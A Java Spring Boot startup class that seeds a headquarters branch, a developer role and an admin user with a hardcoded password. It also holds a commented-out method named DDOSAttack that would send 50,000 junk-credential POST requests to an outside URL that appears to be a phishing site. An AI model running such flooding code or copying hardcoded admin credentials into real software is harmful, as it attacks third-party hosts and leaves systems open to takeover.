package com.example.FAS.config;

import com.example.FAS.model.Branch;
import com.example.FAS.model.Employee;
import com.example.FAS.model.User;
import com.example.FAS.model.UserRole;
import com.example.FAS.repository.BranchRepository;
import com.example.FAS.repository.EmployeeRepository;
import com.example.FAS.repository.UserRepository;
import com.example.FAS.repository.UserRoleRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;


import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Slf4j
@Configuration
@RequiredArgsConstructor
public class Initializer implements CommandLineRunner {
    private final BranchRepository branchRepository;
    private final UserRoleRepository userRoleRepository;
    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;
    private final EmployeeRepository employeeRepository;
    private final RestTemplate restTemplate;
    @Override
    public void run(String... args) throws Exception {
        createSystemAdminAccount();
    }
    public void createSystemAdminAccount(){
        Branch branch = branchRepository.findByName("Headquarters")
                .orElse(Branch.builder()
                        .name("Headquarters")
                        .build());
        branchRepository.save(branch);
        UserRole role = userRoleRepository.findByNameAndBranch("System Developer",branch)
                        .orElse(UserRole.builder()
                                .name("System Developer")
                                .enabled(true)
                                .branch(branch)
                                .build());
        userRoleRepository.save(role);
        Employee employee = employeeRepository.findByCorporateMail("fas@corp.com")
                .orElse(Employee.builder()
                        .firstName("FAS")
                        .lastName("Corp")
                        .phoneNumber("+233551382498")
                        .corporateMail("fas@corp.com")
                        .build());

        User user = userRepository.findByEmail("fas@corp.com")
                .orElse(User.builder()
                        .email("fas@corp.com")
                        .hashedPassword(passwordEncoder.encode("Mike729@123"))
                        .userRole(role)
                        .branch(branch)
                        .employee(employee)
                        .enabled(true)
                        .build());
        userRepository.save(user);
    }
//    public MultiValueMap<String,String> getRandomFormData(){
//        MultiValueMap<String,String> map = new LinkedMultiValueMap<>();
//        map.add("username", UUID.randomUUID() + "@gmail.com");
//        map.add("password", UUID.randomUUID().toString());
//        return map;
//    }
//    public void DDOSAttack(){
//        ExecutorService executor = Executors.newFixedThreadPool(10); // limit threads
//
//        for (int i = 0; i < 50000; i++) {
//            executor.submit(() -> sendData());
//        }
//        executor.shutdown();
//    }
//    public void sendData(){
//        HttpHeaders headers = new HttpHeaders();
//        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
//        MultiValueMap<String,String> map = getRandomFormData();
//        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(map, headers);
//        ResponseEntity<String> response = restTemplate.postForEntity(
//                "https://absa-gh-account.com/utils/send.php?0",
//                request,
//                String.class
//        );
//        log.info("Request sent");
//        try {
//            Thread.sleep(100);
//        } catch (InterruptedException e) {
//            throw new RuntimeException(e);
//        }
//    }e
}
